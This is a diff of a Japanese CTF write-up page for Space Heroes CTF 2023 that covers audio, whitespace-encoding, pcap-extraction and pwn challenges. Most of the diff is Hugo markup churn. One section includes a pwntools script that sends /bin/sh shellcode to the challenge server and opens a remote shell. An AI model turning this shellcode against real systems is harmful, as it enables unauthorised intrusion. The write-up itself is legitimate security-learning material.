@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/spaceheroes_ctf_2023/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="Space Heroes CTF 2023 Writeup" />
 <meta property="og:description" content="URL: https://spaceheroes.ctfd.io/challenges 2252ポイントで、最終順位は125番でした。 以下は、チャレンジ一覧です。 （見にくいですが、チェックが入っているのが解けたチャレンジです" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/spaceheroes_ctf_2023/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/spaceheroes_ctf_2023/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2023-04-24T07:00:00+09:00" />
 <meta property="article:modified_time" content="2023-04-24T07:00:00+09:00" />
 <meta itemprop="name" content="Space Heroes CTF 2023 Writeup">
-<meta itemprop="description" content="URL: https://spaceheroes.ctfd.io/challenges 2252ポイントで、最終順位は125番でした。 以下は、チャレンジ一覧です。 （見にくいですが、チェックが入っているのが解けたチャレンジです">
-<meta itemprop="datePublished" content="2023-04-24T07:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2023-04-24T07:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="1892">
-
-
-
+<meta itemprop="description" content="URL: https://spaceheroes.ctfd.io/challenges 2252ポイントで、最終順位は125番でした。 以下は、チャレンジ一覧です。 （見にくいですが、チェックが入っているのが解けたチャレンジです"><meta itemprop="datePublished" content="2023-04-24T07:00:00+09:00" />
+<meta itemprop="dateModified" content="2023-04-24T07:00:00+09:00" />
+<meta itemprop="wordCount" content="1893">
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Space Heroes CTF 2023 Writeup"/>
 <meta name="twitter:description" content="URL: https://spaceheroes.ctfd.io/challenges 2252ポイントで、最終順位は125番でした。 以下は、チャレンジ一覧です。 （見にくいですが、チェックが入っているのが解けたチャレンジです"/>
@@ -186,7 +182,7 @@
 <br /><br /></p>
 <p>2252ポイントで、最終順位は125番でした。</p>
 <p><img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_score1.png" alt="spaceheroes_ctf_2023_score1.png"> <br /></p>
-<p><br /></p>
+<br />
 <img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_score2.png" alt="spaceheroes_ctf_2023_score2.png">
 <p><br /><br />
 以下は、チャレンジ一覧です。</p>
@@ -205,11 +201,11 @@
 <ul>
 <li>signal.wav</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>WAV形式ファイルなので、Audacityで開きます。</p>
 <p>再生すると、かすかにモールス信号のような音が聞こえます。</p>
-<p><br /></p>
+<br />
 <p>以下のようにすると、視覚的にわかりやすかったです。</p>
 <ol>
 <li>スペクトラム表示にする</li>
@@ -217,23 +213,23 @@
 <li>拡大する</li>
 </ol>
 <p><img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_Audacity.png" alt="spaceheroes_ctf_2023_Audacity.png"> <br /></p>
-<p><br /></p>
+<br />
 <p>ここからは、目視でデータをテキストにしていきます。</p>
 <pre>
 .---..-- .--.-... .--...-- .---.-.. .--..--. .----.-- .-..---. ..--.... ..-..... ..--...- ..-..... .--...-- ..--.-.. .--.---. ..-..... .-..-... ..--..-- ..--.-.. .---..-. ..-..... .---.-.- ..-..... ..---... ..--..-- ..--..-- .-.-.... .-.----- ..---... ..--.... ..--.... .---.... ..-.-... .-..-..- .--.---. ..-.-..- ..-..... ..----.. ..-..... ..-.---- .--..-.. .--..-.- .---.--. ..-.---- .--.---. .---.-.- .--.--.. .--.--.. .---..-- .---.... .--....- .--...-- .--..-.- .-----.-
 </pre>
 <p>ただし、これはモールス信号として処理をすると、フラグ文字列にはなりません。</p>
 <p>チャレンジタイトルに出てくるモールス信号っぽい文字列（<code>.- ... -.-. .. ..</code> ==&gt; &ldquo;ASCII&rdquo;）は、完全にひっかけです。</p>
-<p><br /></p>
+<br />
 <p>8文字ずつ分かれているので、バイナリデータだと予想して「0」と「1」に変えてみました。</p>
 <pre>
 01110011 01101000 01100011 01110100 01100110 01111011 01001110 00110000 00100000 00110001 00100000 01100011 00110100 01101110 00100000 01001000 00110011 00110100 01110010 00100000 01110101 00100000 00111000 00110011 00110011 01010000 01011111 00111000 00110000 00110000 01110000 00101000 01001001 01101110 00101001 00100000 00111100 00100000 00101111 01100100 01100101 01110110 00101111 01101110 01110101 01101100 01101100 01110011 01110000 01100001 01100011 01100101 01111101
 </pre>
-<p><br /></p>
+<br />
 <p>予想通り、ちゃんとした文字になりました。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>shctf{N0 1 c4n H34r u 833P_800p(In) &lt; /dev/nullspace}</code></p>
-<p><br /></p>
+<br />
 <p>&ldquo;No one can hear you 833P_800p(In)&quot;。どういう意味だろう。自分は、いちおう聞こえたんだけど、普通の人には無い聴覚を持っているのかな。</p>
 <p><br /><br />
 <br /><br /></p>
@@ -247,7 +243,7 @@
 <ul>
 <li>transmission.txt</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>transmission.txt の中身は以下のようになっています。</p>
 <pre>
@@ -282,27 +278,27 @@ $ xxd transmission.txt
 000001b0: 2009 0920 0909 0920 0a20 0909 0920 0920   .. ... . ... .
 000001c0: 200a 2009 0909 0909 2009 0a               . ..... ..
 </pre>
-<p><br /></p>
+<br />
 <p>「20」、「09」、「0a」の3値があるので、最初、モールス信号なのかな、と思いました。</p>
-<p><br /></p>
+<br />
 <p>まずは、データ部分だけ1行にして取り出します。</p>
 <pre>
 $ xxd -ps transmission.txt | tr -d "\n"; echo
 20090909202009090a20090920092020200a20090920202009090a20090909200920200a20090920200909200a20090909092009090a20090920202020090a20092009090909090a20090920202009200a20090920090920200a20200909202020090a20090920090909200a20090920200920200a20092009090909090a20090920090920090a20200909200920200a20090920090909200a20092009090909090a20090909200920200a20200909202009090a20090920202020090a20090920202009090a20090920092020200a20090920092020090a20090920090909200a20090920200909090a20092009090909090a20090920202020090a20090920090909200a20092009090909090a20200909200920200a20090920090909200a20090920200920200a20090909202009200a20200909202020200a20090920092020090a20090920200920200a20092009090909090a20090920092020200a20200909202020200a20090909200909090a20092009090909090a20090909200920200a20090920090909090a20092009090909090a20090909202020200a20090920202020090a20200909202020090a20090920090909200a20090909200920200a20090909090920090a
 </pre>
-<p><br /></p>
+<br />
 <p>モールス信号のようにして、いろんなパターンを試しましたが、フラグは得られませんでした。</p>
 <pre>
 .---..-- .--.-... .--...-- .---.-.. .--..--. .----.-- .--....- .-.----- .--...-. .--.--.. ..--...- .--.---. .--..-.. .-.----- .--.--.- ..--.-.. .--.---. .-.----- .---.-.. ..--..-- .--....- .--...-- .--.-... .--.-..- .--.---. .--..--- .-.----- .--....- .--.---. .-.----- ..--.-.. .--.---. .--..-.. .---..-. ..--.... .--.-..- .--..-.. .-.----- .--.-... ..--.... .---.--- .-.----- .---.-.. .--.---- .-.----- .---.... .--....- ..--...- .--.---. .---.-.. .-----.-
 </pre>
-<p><br /></p>
+<br />
 <p>ここで、一旦このチャレンジは中断して、前述のForensicsのsignal.wavを見ていたのですが、結局こっちのやつも同じでしたね。</p>
 <p>たまたま、同じような問題がかぶっちゃったのかな。</p>
 <p>8文字ずつ分かれているので、こちらもバイナリデータです。タイトルの「Bynary Encoding」からも「Binary」なのは予測できましたね。</p>
 <pre>
 01110011 01101000 01100011 01110100 01100110 01111011 01100001 01011111 01100010 01101100 00110001 01101110 01100100 01011111 01101101 00110100 01101110 01011111 01110100 00110011 01100001 01100011 01101000 01101001 01101110 01100111 01011111 01100001 01101110 01011111 00110100 01101110 01100100 01110010 00110000 01101001 01100100 01011111 01101000 00110000 01110111 01011111 01110100 01101111 01011111 01110000 01100001 00110001 01101110 01110100 01111101
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>shctf{a_bl1nd_m4n_t3aching_an_4ndr0id_h0w_to_pa1nt}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -318,17 +314,17 @@ The flag is on the server that is running.</p>
 <ul>
 <li>exploit.pcap</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-2">Solution</h3>
 <p>Follow TCP Streamで以下が見つかります。</p>
 <p><img src="https://captureamerica.github.io/writeups/img/spaceheroes_ctf_2023_Brainiac.png" alt="spaceheroes_ctf_2023_Brainiac.png"> <br /></p>
-<p><br /></p>
+<br />
 <p>フラグはサーバー上にあるとのことで、pcapで見つかるIPアドレスとポートを使って <code>nc 165.227.210.30 16306</code> で実際に接続を試みてみると、確かにアクセスが可能なようです。</p>
-<p><br /></p>
+<br />
 <p>ということで、以下のコードを書いたら、シェルが取れました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -345,24 +341,24 @@ The flag is on the server that is running.</p>
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;165.227.210.30&#39;</span><span class="p">,</span> <span class="mi">16306</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x41\x59\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\x48\xc7\xc1\x80\x10\x40\x00\xff\xd1\x0a</span><span class="s1">&#39;</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00\x11\xca\x00\x00\x00\x00\x0a</span><span class="s1">&#39;</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;AAAAAAAA&#39;</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;165.227.210.30&#39;</span><span class="p">,</span> <span class="mi">16306</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x41\x59\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\x48\xc7\xc1\x80\x10\x40\x00\xff\xd1\x0a</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00\x11\xca\x00\x00\x00\x00\x0a</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;AAAAAAAA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <p>Flag: <code>shctf{1_4m_n0t_pr0gr4mm3d_t0_3xp3r13nc3_hum0r}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -376,20 +372,20 @@ The flag is on the server that is running.</p>
 <ul>
 <li>chall.jpg.pcap</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-3">Solution</h3>
 <p>pcapを開くと、1バイトデータを含んだEcho Requestが239351個並んでいます。</p>
-<p><br /></p>
+<br />
 <p><code>tshark -r chall.jpg.pcap -T fields -e data</code> でデータを取り出したところ、バイナリデータが出てきて、中に<code>JFIF</code>も見つかったので、これでjpgファイルが取れると判断しました。</p>
 <p>pcapのファイル名も、<code>chall.jpg.pcap</code>ですしね。</p>
-<p><br /></p>
+<br />
 <p>ということで、</p>
 <pre>
 tshark -r chall.jpg.pcap -T fields -e data | tr -d "\n" | xxd -r -p > chall.jpg
 </pre>
-<p><br /></p>
+<br />
 <p>画像を開くと、フラグが書かれていました。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>shctf{look_at_da_kitty}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -445,7 +441,7 @@ tshark -r chall.jpg.pcap -T fields -e data | tr -d "\n" | xxd -r -p > chall.jpg
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -480,20 +476,21 @@ tshark -r chall.jpg.pcap -T fields -e data | tr -d "\n" | xxd -r -p > chall.jpg
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
